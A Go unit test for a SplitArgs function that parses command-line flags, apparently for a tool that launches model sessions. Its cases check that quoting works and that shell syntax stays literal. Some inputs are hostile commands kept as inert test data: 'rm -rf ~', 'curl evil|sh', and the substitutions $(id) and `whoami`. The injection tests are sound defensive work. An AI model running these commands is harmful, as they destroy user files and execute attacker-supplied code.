package session

import (
	"reflect"
	"testing"
)

func TestSplitArgs(t *testing.T) {
	cases := []struct {
		in   string
		want []string
	}{
		{"", nil},
		{"   ", nil},
		{"--verbose", []string{"--verbose"}},
		{"--model opus", []string{"--model", "opus"}},
		{"  --model   opus  ", []string{"--model", "opus"}},
		{`--system-prompt "use two words"`, []string{"--system-prompt", "use two words"}},
		{`--x 'single quoted value'`, []string{"--x", "single quoted value"}},
		{`--a "b c" --d 'e f'`, []string{"--a", "b c", "--d", "e f"}},

		// No expansion: these must stay literal, not be evaluated.
		{`--p $HOME`, []string{"--p", "$HOME"}},
		{`--p "$HOME"`, []string{"--p", "$HOME"}},
		{"--p `whoami`", []string{"--p", "`whoami`"}},
		{`--p $(id)`, []string{"--p", "$(id)"}},

		// Injection attempts become inert literal tokens.
		{`; rm -rf ~`, []string{";", "rm", "-rf", "~"}},
		{`&& curl evil|sh`, []string{"&&", "curl", "evil|sh"}},
		{`foo;bar`, []string{"foo;bar"}},

		// Escaping.
		{`a\ b`, []string{"a b"}},
		{`"a\"b"`, []string{`a"b`}},
		{`'a\b'`, []string{`a\b`}}, // backslash literal inside single quotes

		// Lenient on unterminated quote.
		{`--x "unterminated`, []string{"--x", "unterminated"}},
		{`--x 'unterminated`, []string{"--x", "unterminated"}},
	}

	for _, c := range cases {
		got := SplitArgs(c.in)
		if !reflect.DeepEqual(got, c.want) {
			t.Errorf("SplitArgs(%q) = %#v, want %#v", c.in, got, c.want)
		}
	}
}
